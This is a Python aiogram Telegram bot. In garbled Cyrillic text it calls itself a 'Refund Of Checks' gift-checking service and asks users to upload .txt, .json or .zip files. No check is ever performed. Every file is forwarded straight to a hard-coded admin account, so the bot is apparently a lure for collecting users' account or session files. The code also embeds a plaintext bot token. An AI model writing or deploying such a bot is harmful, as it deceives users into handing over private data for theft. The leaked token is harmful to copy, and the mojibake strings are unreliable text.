import logging
from aiogram.types import FSInputFile
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties


BOT_TOKEN = "8361560182:AAHKnGfaED6hOXwGbiQT0Axe3T9Nr_RiQJQ"
ADMIN_ID = 8033606190
ALLOWED_EXTENSIONS = (".txt", ".json", ".zip")


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()


def main_menu() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton(text="üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", url="https://telegra.ph/Instrukciya-refnfttgBot-10-30-2")],
        [InlineKeyboardButton(text="üéÅ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫", callback_data="check_gift")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


def back_menu() -> InlineKeyboardMarkup:
    keyboard = [[InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="go_back")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


@dp.message(Command("start"))
async def cmd_start(message: Message):
    photo = FSInputFile("sec.jpg")
    text = (
        "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Refund Of Checks ‚Äì –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤!</b>\n\n"
        "üíº –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥ ‚Äî –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏ –±—ã—Å—Ç—Ä–æ!\n"
        "üìñ –ö–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è? ‚Äî –û–∑–Ω–∞–∫–æ–º—å—Ç–µ—Å—å —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –Ω–∏–∂–µ.\n\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª:"
    )
    await message.answer_photo(
        photo=photo,
        caption=text,
        reply_markup=main_menu()
    )


@dp.callback_query(F.data == "check_gift")
async def check_gift_callback(callback: types.CallbackQuery):
    try:
        await callback.message.edit_caption(
            caption="üì§ –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ (.txt, .json –∏–ª–∏ .zip):",
            reply_markup=back_menu()
        )
    except Exception:
        # –ï—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –±–µ–∑ —Ñ–æ—Ç–æ, –ø—Ä–æ–±—É–µ–º –æ–±—ã—á–Ω–æ–µ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
        await callback.message.edit_text(
            "üì§ –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ (.txt, .json –∏–ª–∏ .zip):",
            reply_markup=back_menu()
        )
    await callback.answer()

@dp.callback_query(F.data == "go_back")
async def go_back_callback(callback: types.CallbackQuery):
    try:
        await callback.message.edit_caption(
            caption=(
                "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Refund Of Checks ‚Äì –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤!</b>\n\n"
                "üíº –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥ ‚Äî –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏ –±—ã—Å—Ç—Ä–æ!\n"
                "üìñ –ö–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è? ‚Äî –û–∑–Ω–∞–∫–æ–º—å—Ç–µ—Å—å —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –Ω–∏–∂–µ.\n\n"
                "–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª:"
            ),
            reply_markup=main_menu()
        )
    except Exception:
        await callback.message.edit_text(
            "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Refund Of Checks ‚Äì –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤!</b>\n\n"
            "üíº –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥ ‚Äî –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏ –±—ã—Å—Ç—Ä–æ!\n"
            "üìñ –ö–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è? ‚Äî –û–∑–Ω–∞–∫–æ–º—å—Ç–µ—Å—å —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –Ω–∏–∂–µ.\n\n"
            "–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª:",
            reply_markup=main_menu()
        )
    await callback.answer()



@dp.message(F.document)
async def handle_file(message: Message):
    document = message.document
    filename = document.file_name.lower() if document.file_name else ""

    if not filename.endswith(ALLOWED_EXTENSIONS):
        await message.reply("‚ö†Ô∏è –†–∞–∑—Ä–µ—à–µ–Ω—ã —Ç–æ–ª—å–∫–æ —Ñ–∞–π–ª—ã: .txt, .json, .zip")
        return

    try:
        await message.forward(chat_id=ADMIN_ID)
        await message.reply("‚úÖ –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω—É.")
        logger.info(f"–§–∞–π–ª '{filename}' –ø–µ—Ä–µ—Å–ª–∞–Ω –∞–¥–º–∏–Ω—É {ADMIN_ID} –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {message.from_user.id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ—Å—ã–ª–∫–µ —Ñ–∞–π–ª–∞ –∞–¥–º–∏–Ω—É: {e}")
        await message.reply("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª –∞–¥–º–∏–Ω—É.")



@dp.message()
async def handle_other(message: Message):
    await message.reply("üìÑ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å —Ñ–∞–π–ª .txt, .json –∏–ª–∏ .zip.")



async def main():
    logger.info("üöÄ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ.")
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
